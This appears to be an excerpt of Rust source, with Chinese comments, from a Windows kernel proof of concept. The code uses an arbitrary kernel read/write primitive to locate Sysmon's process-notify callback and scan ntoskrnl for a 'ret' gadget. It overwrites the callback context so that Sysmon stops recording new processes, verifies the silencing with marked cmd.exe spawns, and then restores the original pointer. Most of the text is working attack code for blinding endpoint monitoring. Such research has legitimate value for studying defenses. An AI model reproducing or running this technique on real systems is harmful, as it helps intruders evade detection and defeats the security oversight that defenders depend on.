...
fn find_module(name_lower: &str) -> Option<(usize, usize)> {
    ...
    let mut rl: u32 = 0;
    let s = unsafe { NtQuerySystemInformation(SYSTEM_MODULE_INFORMATION, buf.as_mut_ptr() as *mut c_void, buf.len() as u32, &mut rl) };
    if s as u32 == 0xC0000004 { buf = vec![0u8; rl as usize + 0x1000];
        unsafe { NtQuerySystemInformation(SYSTEM_MODULE_INFORMATION, buf.as_mut_ptr() as *mut c_void, buf.len() as u32, &mut rl) };
    }
...
fn spawn_n(n: u32, label: &str) {
    for _ in 0..n {
        let _ = std::process::Command::new("cmd.exe").arg("/c").arg("exit 0").spawn();
    }
...
fn spawn_marked_and_check(marker: &str) -> bool {
    ...
    let _ = std::process::Command::new("cmd.exe")
        .args(["/c", &format!("title {}", marker), "&&", "exit", "0"]).spawn();
...
fn spawn_with_marker(marker: &str) {
    ...
    let _ = std::process::Command::new("cmd.exe").args(["/c", &arg]).spawn();
    std::thread::sleep(std::time::Duration::from_millis(800));
}
...
fn main() {
    ...
    if !notify_routines::is_occupied(slot5_packed) {
        eprintln!("[FAIL] slot[5] not occupied"); loaded.unload(); std::process::exit(2);
    }
    let ctx5 = notify_routines::unpack(slot5_packed) as usize;
    let orig_routine = krw.kread_u64(ctx5).unwrap();
    println!("[K.1] slot[5] ctx=0x{:016x} orig routine=0x{:016x}", ctx5, orig_routine);

    // ---- 红线: 验证 orig_routine 在 SysmonDrv.sys 范围 ----
    let (sysmon_base, sysmon_size) = match find_module("sysmondrv.sys") {
        Some(t) => t,
        None => { eprintln!("[FAIL] SysmonDrv.sys not found in module list");
    ...
    println!("[K.2] SysmonDrv.sys base=0x{:016x} size=0x{:X}", sysmon_base, sysmon_size);
    println!("       orig routine in SysmonDrv range? {} (RVA 0x{:X})",
             in_range, (orig_routine as usize) - sysmon_base);
    if !in_range {
        eprintln!("[FAIL] slot[5] routine NOT in SysmonDrv — aborting (wrong slot)");
        loaded.unload(); std::process::exit(4);
    }
    ...
    println!("[K.3] ret gadget ntoskrnl+0x17F0 = 0x{:016x} bytes=[{:02x} {:02x} {:02x} {:02x}]",
    ...
    if gbytes[0] != 0xC3 {
        ...
        for off in (0x1000..0x300000).step_by(0x10) {
            ...
            if krw.kread(base + off, &mut b).is_ok() && b[0] == 0xC3 {
                found = base + off; break;
            }
        }
        if found == 0 { eprintln!("[FAIL] no ret gadget found"); loaded.unload(); std::process::exit(5); }
    ...
    println!("       Sysmon recorded BASELINE marker? {} (expect true = callback active)", base_recorded);

    // ---- DATA WRITE: ctx+0x00 = ret gadget ----
    println!("\n[K.5] DATA WRITE: repurpose ctx+0x00 -> ret gadget 0x{:016x}", gadget);
    if let Err(e) = krw.kwrite_u64(ctx5, gadget as u64) {
        eprintln!("[FAIL] kwrite ctx: {}", e); loaded.unload(); std::process::exit(6);
    }
    let now = krw.kread_u64(ctx5).unwrap();
    println!("       ctx+0x00 now = 0x{:016x} (expected gadget) {}", now,
             if now == gadget as u64 { "OK" } else { "MISMATCH" });
    ...
    println!("       Sysmon recorded REPURPOSED marker? {} (expect false = callback SILENCED)",
             repurposed_recorded);
    ...
    // ---- 立即恢复 ----
    println!("\n[K.7] RESTORE: ctx+0x00 -> orig routine 0x{:016x}", orig_routine);
    if let Err(e) = krw.kwrite_u64(ctx5, orig_routine) {
        eprintln!("[FAIL] restore kwrite: {} — SysmonDrv callback stays repurposed!", e);
        loaded.unload(); std::process::exit(7);
    }
    let restored = krw.kread_u64(ctx5).unwrap();
    println!("       ctx+0x00 restored = 0x{:016x} {}", restored,
             if restored == orig_routine { "OK" } else { "MISMATCH" });

    // ---- 恢复后验证 ----
    println!("\n[K.8] VERIFY RESTORE: spawn marker ...");
    spawn_with_marker("RESTORED_3333");
    let restored_recorded = spawn_marked_and_check("RESTORED_3333");
    println!("       Sysmon recorded RESTORED marker? {} (expect true = callback RESUMED)", restored_recorded);
